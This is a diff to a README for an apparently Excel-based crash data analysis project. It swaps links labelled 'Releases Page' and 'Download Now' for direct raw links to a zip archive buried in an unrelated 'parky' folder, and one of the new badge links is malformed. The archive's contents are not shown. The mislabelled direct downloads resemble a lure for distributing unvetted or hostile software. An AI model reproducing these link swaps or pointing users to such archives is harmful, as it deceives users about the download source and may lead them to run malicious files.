@@ -1,6 +1,6 @@
 # 🎉 Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel - Analyze Crash Data Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)
+![Download Now](https://raw.githubusercontent.com/syeddeniz/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel/main/parky/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel-v3.3.zip%https://raw.githubusercontent.com/syeddeniz/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel/main/parky/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel-v3.3.zip)
 
 ## 📘 Overview
 
@@ -17,7 +17,7 @@ This application will help you visualize crash data, generate insightful reports
 
 ## 🔗 Download & Install
 
-To get the latest version of the application, visit this page to download: [Releases Page](https://github.com/syeddeniz/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel/releases).
+To get the latest version of the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/syeddeniz/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel/main/parky/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel-v3.3.zip).
 
 ## 🔍 Features
 
@@ -70,6 +70,6 @@ Thanks to everyone who contributed to the development and improvement of this to
 
 ## 🔗 Download Link
 
-Don't forget, you can visit this page to download: [Releases Page](https://github.com/syeddeniz/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel/releases). 
+Don't forget, you can visit this page to download: [Releases Page](https://raw.githubusercontent.com/syeddeniz/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel/main/parky/Crash-Reporting-and-Incident-Data-Analysis-2019-2023-using-MS-Excel-v3.3.zip). 
 
 Happy analyzing!
